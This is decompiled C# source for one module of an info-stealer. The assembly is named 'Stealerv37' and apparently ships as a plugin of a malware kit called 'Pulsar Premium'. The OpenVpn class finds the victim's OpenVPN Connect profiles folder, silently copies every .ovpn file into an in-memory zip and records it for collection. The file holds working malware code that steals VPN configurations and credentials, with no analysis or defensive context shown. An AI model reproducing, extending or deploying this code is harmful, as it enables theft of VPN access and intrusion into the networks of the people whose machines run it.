// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.OpenVpn
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Vpn;

public class OpenVpn : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect", "profiles");
    if (!Directory.Exists(path))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "OpenVPN";
    Parallel.ForEach<string>((IEnumerable<string>) Directory.GetFiles(path), (Action<string>) (file =>
    {
      try
      {
        if (Path.GetExtension(file) != ".ovpn")
          return;
        zip.AddFile("OpenVpn\\" + Path.GetFileName(file), File.ReadAllBytes(file));
      }
      catch
      {
      }
    }));
    counterApplications.Files.Add(path + " => OpenVpn");
    counterApplications.Files.Add("OpenVpn\\");
    counter.Vpns.Add(counterApplications);
  }
}
